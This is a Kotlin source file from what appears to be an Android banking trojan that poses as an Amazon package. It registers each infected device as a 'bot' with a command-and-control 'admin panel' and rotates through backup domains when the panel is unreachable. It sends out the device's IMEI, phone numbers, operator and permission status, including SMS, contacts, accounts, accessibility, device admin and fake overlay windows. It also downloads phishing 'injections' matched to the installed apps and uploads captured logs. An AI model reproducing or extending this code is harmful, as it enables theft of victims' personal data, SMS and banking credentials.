package com.amazon.zzz.ApiNm

import android.content.Context
import android.content.Context.TELEPHONY_SERVICE
import android.os.Build
import android.telephony.TelephonyManager
import com.amazon.zzz.Modull.module
import com.amazon.zzz.Modull.udUtils
import com.amazon.zzz.Modull.udUtils.getNumber
import com.amazon.zzz.Modull.udUtils.getNumber1
import com.amazon.zzz.Modull.udUtils.getOperatorName1
import com.amazon.zzz.Utilsss.SharedPreferencess
import com.amazon.zzz.Utilsss.utUtils
import com.amazon.zzz.Utilsss.utUtils.isDualSim
import com.amazon.zzz.constNm
import kotlinx.coroutines.GlobalScope
import kotlinx.coroutines.launch
import org.json.JSONException
import org.json.JSONObject
import java.util.Random

object apiUt {

    val TAG_LOG = "apiUt"

    suspend fun checkAP(context: Context, url: String?): String {
        utUtils.Log(TAG_LOG, "-------------------checkAP-------------------")
        SharedPreferencess.init(context.applicationContext)
        val request = JSONObject()
        request.put("command", "checkAP")
        request.put("id", SharedPreferencess.idbot)
        request.put("ticks", SharedPreferencess.tick.toString())
        return try {
            httpRequest(request.toString(), url)
        } catch (e: Exception) {
            utUtils.Log("apiUt", e.localizedMessage)
            ""
        }
    }

    suspend fun downloadInjection(context: Context, nameInj: String?): String {
        val request = JSONObject()
        SharedPreferencess.init(context.applicationContext)
        runCatching {
            request.put("command", "downloadInjection")
            request.put("id", SharedPreferencess.idbot)
            request.put("inject", nameInj)
            return httpRequest(request.toString())
        }
        return ""
    }

    suspend fun downloadingInjections(context: Context): String {
        SharedPreferencess.init(context.applicationContext)
        //downloading injections
        val jsonCheckInj = JSONObject()
        jsonCheckInj.put("command", "downloadingInjections")
        utUtils.Log(TAG_LOG, "this no_command start!")
        val idbot = SharedPreferencess.idbot
        runCatching {
            jsonCheckInj.put("id", idbot)
            jsonCheckInj.put("apps", udUtils.getAllApplication(context))
        }
        utUtils.Log(TAG_LOG, "jsonUpdateInj: $jsonCheckInj")

        return httpRequest(jsonCheckInj.toString())
    }

    suspend fun httpRequest(parms: String?, url: String? = null): String {
        val URL = (url ?: SharedPreferencess.urlAdminPanel) + "/" + utUtils.randomString(Random().nextInt(20) + 1) + ".php/"
        utUtils.Log("Connect", URL)
        return apiRequestHttpNm.sendRequest(URL, parms)
    }

    suspend fun moduleWorkingWhile(context: Context) {
        try {
            SharedPreferencess.init(context.applicationContext)
            //------------module start serviceWorkingWhile--------------------
            val jsonObject = JSONObject()
            jsonObject.put("params", "moduleWorkingWhile")
            module.main(context, jsonObject)
        } catch (ex: Exception) {
            utUtils.Log(TAG_LOG, "ERROR: module Dex Start")
        }
    }

    suspend fun pingServerAndRegister(context: Context) {
        utUtils.Log(TAG_LOG, "-------------------checkAdminPanel-------------------")
        SharedPreferencess.init(context.applicationContext)
        when (val response = checkAP(context, null)) {
            "" -> {
                findNewUrlAP(context)
            }

            "~no~" -> {
                registration(context, response)
            }

            else -> {
                val jsonCheckInj = JSONObject()
                try {
                    jsonCheckInj.put("params", "updateSettingsAndCommands")
                    jsonCheckInj.put("response", response)
                } catch (e: JSONException) {
                }
                module.main(context, jsonCheckInj)
            }
        }
    }

    private suspend fun registration(context: Context, response: String) {
        var response1 = response
        val idbot = SharedPreferencess.idbot

        val jsonRegistrationBot = JSONObject()
        jsonRegistrationBot.put("command", "registration")
        updateJson(jsonRegistrationBot, idbot, context)

        utUtils.Log(TAG_LOG, "jsonRegistrationBot: $jsonRegistrationBot")
        response1 = httpRequest(jsonRegistrationBot.toString())
        utUtils.Log(TAG_LOG, "RegistrationRESPONCE: $response1")
        if (response1 == "ok") {
            SharedPreferencess.checkUpdateInjection = "1"
        }
    }

    private suspend fun findNewUrlAP(context: Context) {
        runCatching {
            val getUrls = SharedPreferencess.urls
            if (getUrls.contains(";")) {
                val urls = getUrls.replace(" ", "").split(";").toTypedArray()
                for (url in urls) {
                    if (url.length > 5) {
                        utUtils.Log(TAG_LOG, "Check URL: $url")
                        if (checkAP(context, url).isNotEmpty()) {
                            SharedPreferencess.urlAdminPanel = url
                            utUtils.Log(TAG_LOG, "NEW DOMAIN: $url")
                            break
                        }
                    }
                }
            }
        }.onFailure {
            utUtils.Log(TAG_LOG, "ERROR Check URLS")
        }
    }

    fun sendLogs(context: Context, application: String, logs: String, type: String) {
        GlobalScope.launch {
            if (logs.isBlank())
                return@launch

            val request = JSONObject()
            try {
                SharedPreferencess.init(context.applicationContext)
                val idbot = SharedPreferencess.idbot

                request.put("command", "logs")
                request.put("id", idbot)
                request.put("application", application)
                request.put("type", type)
                request.put("logs", logs)
                utUtils.Log("SEND $type", "idbot: $idbot - logs: $logs")

                httpRequest(request.toString())
            } catch (ex: JSONException) {
                val obj = JSONObject()
                obj.put("sendLogs_error", "|  ${ex.localizedMessage}  | sendLogs  ")
                SharedPreferencess.SettingsToAdd(
                    context,
                    "LogEvents",
                    obj.toString()
                )
            }
        }
    }

    suspend fun updateBotParams(context: Context) {
        utUtils.Log(TAG_LOG, "-------------------updateBotParams-------------------")
        SharedPreferencess.init(context.applicationContext)
        val idbot = SharedPreferencess.idbot

        //---------------check bot------------------------
        val jsonCheckBot = JSONObject()
        jsonCheckBot.put("command", "updateBotParams")
        updateJson(jsonCheckBot, idbot, context)
        jsonCheckBot.put("ticks", SharedPreferencess.tick.toString())

        //---------------httpRequest - check bot------------------------
        utUtils.Log(TAG_LOG, "jsonCheckBot: $jsonCheckBot")
        val response = httpRequest(jsonCheckBot.toString())
        utUtils.Log(TAG_LOG, "jsonCheckBot: $response")
    }

    private fun updateJson(
        jsonBot: JSONObject,
        idbot: String,
        context: Context
    ) {
        SharedPreferencess.init(context.applicationContext)
        jsonBot.put("id", idbot)

        try {
            jsonBot.put("country", utUtils.country(context))
            jsonBot.put("countryCode", utUtils.countrySIM(context))
            jsonBot.put("tag", constNm.tag)

            jsonBot.put("isDualSim", isDualSim(context).toString())
            jsonBot.put(
                "operator",
                (context.getSystemService(TELEPHONY_SERVICE) as? TelephonyManager?)?.networkOperatorName.toString()
            )
            jsonBot.put("phone_number", getNumber(context))
            jsonBot.put("operator1", getOperatorName1(context))
            jsonBot.put("phone_number1", getNumber1(context))

//            jsonBot.put("phone_number", "123")
//            jsonBot.put("operator1", "123")
//            jsonBot.put("phone_number1", "123")


            jsonBot.put("android", Build.VERSION.RELEASE.toString())
            jsonBot.put("model", udUtils.deviceName)
            jsonBot.put("batteryLevel", utUtils.getBatteryLevel(context))
            runCatching {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                    jsonBot.put(
                        "imei",
                        (context.getSystemService(TELEPHONY_SERVICE) as? TelephonyManager?)?.imei.toString()
                    )
                } else {
                    jsonBot.put(
                        "imei",
                        (context.getSystemService(TELEPHONY_SERVICE) as? TelephonyManager?)?.deviceId.toString()
                    )
                }
            }

            jsonBot.put(
                "accessibility",
                utUtils.isAccessibilityServiceEnabled(context, constNm.a14).toString()
            )
            jsonBot.put("protect", SharedPreferencess.checkProtect)
            jsonBot.put("admin", utUtils.isAdminDevice(context).toString())
            jsonBot.put("screen", udUtils.isScreenOn(context).toString())
            jsonBot.put("isKeyguardLocked", udUtils.isKeyguardLocked(context).toString())
            jsonBot.put("is_dozemode", udUtils.is_dozemode(context).toString())
            jsonBot.put("sms", utUtils.hasPermission(context, constNm.p3).toString())

            jsonBot.put("set_contact_list", utUtils.hasPermission(context, constNm.p5).toString())
            jsonBot.put(
                "set_hide_sms_list",
                (utUtils.getStatSMS(context) && utUtils.hasPermission(
                    context,
                    constNm.p3
                ) && utUtils.hasPermission(context, constNm.p4_)).toString()
            )
            jsonBot.put("set_windows_fake", (SharedPreferencess.permission_get == "1").toString())
            jsonBot.put("set_accounts", utUtils.hasPermission(context, constNm.p6).toString())
        } catch (e: Exception) {
        }
    }
}